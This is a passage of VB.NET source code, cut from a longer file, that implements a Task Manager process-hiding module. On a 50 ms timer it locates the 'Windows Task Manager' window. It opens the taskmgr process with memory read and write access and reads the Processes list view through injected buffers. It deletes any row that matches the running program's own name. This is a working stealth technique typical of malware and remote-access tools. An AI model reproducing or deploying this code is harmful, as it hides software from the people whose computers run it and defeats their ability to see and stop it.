    Public MyProc As String

    Dim ProcLV As IntPtr = IntPtr.Zero
#End Region

#Region " Timer's Tick "
    Private Sub t_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If ProcLV = IntPtr.Zero Then
            hwnd = FindWindow(vbNullString, "Windows Task Manager")
            If hwnd <> 0 Then
                EnumChildWindows(hwnd, New EnumDelegate(AddressOf TMListViewDelete.EnumChildWindows), 0)
            End If
        Else
            GetListView(hwnd, ProcLV)
        End If
    End Sub
#End Region

#Region " Running Property "
    Public Property Running() As Boolean
        Get
            If t.Enabled = True Then
                Return True
            Else
                Return False
            End If
        End Get
        Set(ByVal value As Boolean)
            If value = True Then
                MyProc = Process.GetCurrentProcess.ProcessName
                If Not t.Interval = 50 Then
                    With t
                        AddHandler t.Tick, AddressOf t_Tick
                        .Interval = 50
                        .Enabled = True
                        .Start()
                    End With
                Else
                    t.Enabled = True
                    t.Start()
                End If
            Else
                t.Enabled = False
                t.Stop()
                ProcLV = IntPtr.Zero
            End If
        End Set
    End Property

#End Region

#Region " Getting ListViews"
    Private Function EnumChildWindows(ByVal lngHwnd As IntPtr, ByVal lngLParam As Integer) As Integer
        Dim strClassName As String = GetClass(lngHwnd)
        Dim strText As String = GetTitleText(lngHwnd)
        If InStr(strClassName.ToString, "SysListView32") Then
            GetListView(hwnd, lngHwnd)
            If InStr(strText, "Processes") Then
                ProcLV = lngHwnd
            End If
        End If
        Dim Classes As String = lngHwnd.ToString & ", " & strClassName & ", " & strText
        Return 1
    End Function
    Private Function GetClass(ByVal handle As IntPtr) As String
        Dim strClassName As New System.Text.StringBuilder()
        strClassName.Length = 255
        GetClassName(handle, strClassName, strClassName.Length)
        Return strClassName.ToString
    End Function
    Private Function GetTitleText(ByVal handle As IntPtr) As String
        Dim titleText As New System.Text.StringBuilder()
        titleText.Length = GetWindowTextLength(handle) + 1
        GetWindowText(handle, titleText, titleText.Length)
        Return titleText.ToString
    End Function

#End Region
End Module

#End Region
#Region " Get Items "
Module GetItems
    Dim listViewHandle As IntPtr
#Region " Functions "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function OpenProcess( _
        ByVal dwDesiredAccess As UInteger, _
        ByVal bInheritHandle As Boolean, _
        ByVal dwProcessId As Integer) As SafeProcessHandle
    End Function


#Region " ReadProcessMemory "
    <DllImport(kernel32, EntryPoint:="ReadProcessMemory", SetLastError:=True, CharSet:=CharSet.Unicode)> _
    Public Function ReadProcessMemoryW( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As StringBuilder, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True, CharSet:=CharSet.Ansi)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As StringBuilder, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As LV_ITEM, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As HDITEM, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function ReadProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByVal lpBuffer As IntPtr, _
        ByVal nSize As Integer, _
        ByRef bytesRead As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region

#Region " SendMessage "
    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As IntPtr, _
        ByVal lParam As IntPtr) As Integer
    End Function

    ' Has a different return type, so can't overload.
    <DllImport(user32, SetLastError:=True, EntryPoint:="SendMessageA")> _
    Public Function GetHeaderSendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As IntPtr, _
        ByVal lParam As IntPtr) As IntPtr
    End Function

    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As Integer, _
        ByVal lParam As StringBuilder) As Integer
    End Function

    <DllImport(user32, SetLastError:=True)> _
    Public Function SendMessage( _
        ByVal hWnd As IntPtr, _
        ByVal message As UInteger, _
        ByVal wParam As Integer, _
        ByVal lParam As IntPtr) As Integer
    End Function
#End Region

#Region " VirtualAllocEx "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function VirtualAllocEx( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpAddress As IntPtr, _
        ByVal dwSize As Integer, _
        ByVal flAllocationType As UInteger, _
        ByVal flProtect As UInteger) As IntPtr
    End Function
#End Region

#Region " VirtualFreeEx "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function VirtualFreeEx( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpAddress As IntPtr, _
        ByVal dwSize As Integer, _
        ByVal dwFreeType As UInteger) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region

#Region " WriteProcessMemory "
    <DllImport(kernel32, SetLastError:=True)> _
    Public Function WriteProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As LV_ITEM, _
        ByVal nSize As Integer, _
        ByRef lpNumberOfBytesWritten As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <DllImport(kernel32, SetLastError:=True)> _
    Public Function WriteProcessMemory( _
        ByVal hProcess As SafeProcessHandle, _
        ByVal lpBaseAddress As IntPtr, _
        ByRef lpBuffer As HDITEM, _
        ByVal nSize As Integer, _
        ByRef lpNumberOfBytesWritten As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
#End Region
#End Region
#Region " Consts "
    Public Const LVM_FIRST As UInteger = &H1000
    Public Const LVM_DELETEITEM As UInteger = (LVM_FIRST + 8)

    Public Const kernel32 As String = "kernel32"
    Public Const user32 As String = "user32"
    Public Const LVM_GETITEMCOUNT As UInteger = &H1004
    Public Const LVM_GETITEMTEXT As UInteger = &H102D
    Public Const LVM_GETHEADER As UInteger = &H101F
    Public Const HDM_GETIEMA As UInteger = &H1203
    Public Const HDM_GETITEMW As UInteger = &H120B
    Public Const HDM_GETITEMCOUNT As UInteger = &H1200
    Public Const HDM_GETUNICODEFORMAT As UInteger = &H2006
    Public Const HDI_TEXT As UInteger = 2
    Public Const MEM_COMMIT As UInteger = &H1000
    Public Const MEM_RELEASE As UInteger = &H8000
    Public Const PAGE_READWRITE As UInteger = 4
    Public Const PROCESS_VM_READ As UInteger = &H10
    Public Const PROCESS_VM_WRITE As UInteger = &H20
    Public Const PROCESS_VM_OPERATION As UInteger = &H8
    Public Const WM_GETTEXT As UInteger = &HD
    Public Const WM_GETTEXTLENGTH As UInteger = &HE
#End Region
#Region " Structures "
#Region " LV_ITEM "
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Public Structure LV_ITEM
        Public mask As UInteger
        Public iItem As Integer
        Public iSubItem As Integer
        Public state As UInteger
        Public stateMask As UInteger
        Public pszText As IntPtr
        Public cchTextMax As Integer
        Public iImage As Integer
        Public lParam As IntPtr
        Public iIndent As Integer
        Public iGroupId As Integer
        Public cColumns As Integer
        Public puColumns As IntPtr
        Public piColFmt As IntPtr
        Public iGroup As Integer
        Public Function Size() As Integer
            Return Marshal.SizeOf(Me)
        End Function
    End Structure
#End Region

#Region " HDITEM "
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure HDITEM
        Public mask As UInteger
        Public cxy As Integer
        Public pszText As IntPtr
        Public hbm As IntPtr
        Public cchTextMax As Integer
        Public fmt As Integer
        Public lParam As IntPtr
        Public iImage As Integer
        Public iOrder As Integer
        Public Function Size() As Integer
            Return Marshal.SizeOf(Me)
        End Function
    End Structure
#End Region
#End Region
#Region "Get List View Items "
    Public Function GetListView(ByVal handle As IntPtr, ByVal lvhandle As IntPtr) As Boolean
        listViewHandle = lvhandle
        Dim hParent As IntPtr = handle

        Dim id As Integer = -1
        Try
            For Each p In Process.GetProcessesByName("taskmgr")
                If p.MainWindowTitle = "Windows Task Manager" Then
                    id = p.Id
                End If
            Next
            If id = -1 Then
                Throw New ArgumentException("Could not find the process specified", "processName")
            End If
        Catch : Return False : End Try

        Dim hprocess As SafeProcessHandle = Nothing
        Try
            hprocess = OpenProcess(PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, id)

            If hprocess Is Nothing Then
                If Marshal.GetLastWin32Error = 0 Then
                    Throw New System.ComponentModel.Win32Exception
                End If
            End If

            Dim itemCount As Integer = SendMessage(listViewHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero)

            For row As Integer = 0 To itemCount - 1

                Dim lvi As New ListViewItem(GetItem(row, 0, hprocess))
                If lvi.Text.Contains(TMListViewDelete.MyProc) Then SendMessage(listViewHandle, LVM_DELETEITEM, row, IntPtr.Zero)
            Next
        Catch : Return False
        Finally
            If hprocess IsNot Nothing Then
                hprocess.Close()
                hprocess.Dispose()
            End If

        End Try
        Return True
    End Function
#End Region
#Region " SafeProcessHandle "
    Friend NotInheritable Class SafeProcessHandle
        Inherits SafeHandleZeroOrMinusOneIsInvalid
        Declare Auto Function CloseHandle Lib "kernel32.dll" (ByVal hObject As IntPtr) As Boolean

        Public Sub New()
            MyBase.New(True)
        End Sub

        Public Sub New(ByVal handle As IntPtr)
            MyBase.New(True)
            MyBase.SetHandle(handle)
        End Sub

        Protected Overrides Function ReleaseHandle() As Boolean
            Return CloseHandle(MyBase.handle)
        End Function

    End Class
#End Region
#Region " GetItem "
    Private Function GetItem(ByVal row As Integer, ByVal subitem As Integer, _
                                ByVal hProcess As SafeProcessHandle) As String

        Dim lvitem As New LV_ITEM
        lvitem.cchTextMax = 260
        lvitem.mask = 1
        lvitem.iItem = row
        lvitem.iSubItem = subitem
        Dim pString As IntPtr
        Dim s As New StringBuilder(260)
        Try

            pString = VirtualAllocEx(hProcess, IntPtr.Zero, 260, MEM_COMMIT, PAGE_READWRITE)
            lvitem.pszText = pString
            Dim pLvItem As IntPtr
            Try
                pLvItem = VirtualAllocEx(hProcess, IntPtr.Zero, lvitem.Size, MEM_COMMIT, PAGE_READWRITE)
                Dim boolResult As Boolean = WriteProcessMemory(hProcess, pLvItem, lvitem, lvitem.Size, 0)
                If boolResult = False Then Throw New Win32Exception

                SendMessage(listViewHandle, LVM_GETITEMTEXT, row, pLvItem)
                boolResult = ReadProcessMemory(hProcess, pString, s, 260, 0)
                If boolResult = False Then Throw New Win32Exception
                boolResult = ReadProcessMemory(hProcess, pLvItem, lvitem, Marshal.SizeOf(lvitem), 0)
                If boolResult = False Then Throw New Win32Exception
            Finally
                If pLvItem.Equals(IntPtr.Zero) = False Then
                    Dim freeResult As Boolean = VirtualFreeEx(hProcess, pLvItem, 0, MEM_RELEASE)
                    If freeResult = False Then Throw New Win32Exception
                End If
            End Try
        Finally
            If pString.Equals(IntPtr.Zero) = False Then
                Dim freeResult As Boolean = VirtualFreeEx(hProcess, pString, 0, MEM_RELEASE)
                If freeResult = False Then Throw New Win32Exception
            End If
        End Try

        Return s.ToString
    End Function
#End Region
End Module
#End Region